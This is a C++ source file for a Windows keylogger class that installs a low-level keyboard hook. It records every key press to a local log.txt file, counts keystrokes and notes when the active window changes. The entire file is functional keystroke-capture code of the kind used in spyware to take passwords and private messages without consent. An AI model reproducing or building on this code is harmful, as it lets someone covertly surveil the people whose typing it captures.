#include "KeyboardLog.h"

WindowRecorder KeyboardLog::recorder;
bool KeyboardLog::logStarted;
int KeyboardLog::keystrokesNum;

KeyboardLog::KeyboardLog()
{		
	logStarted = false;
	keystrokesNum = 0;
	recorder.start();
}


KeyboardLog::~KeyboardLog()
{	
	recorder.stop();	
}


LRESULT CALLBACK KeyboardLog::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{	
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;	

	/* Open file for writing */
	std::ofstream out;
	out.open("log.txt", std::ofstream::app);

	/* Need to fix this so that it is handled in the WindowRecorder trhead */
	if (recorder.windowChange())
	{
		out << "Total number of keystrokes so far: " << keystrokesNum << std::endl;				

		if (!logStarted)
		{
			logStarted = true;
		}
		else
		{

		}

	}

	if (nCode == HC_ACTION)
	{
		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			//std::cout << p->vkCode;		
			
			keystrokesNum++;	/* Increase keystroke counter */

			/* Record keyboard input */
			switch (p->vkCode) 
			{
			case 13:
				/* Handle Enter key */
				out << std::endl;
				break;
			case 222:
				/* Handle ' */
				out << "'";
				break;
			case 186:
				/* Handle ; */\
				out << ";";
				break;
			default:
				out << (char)p->vkCode; 
				break;
			}					
			
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			break;
		}
	}
	
	out.close();
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}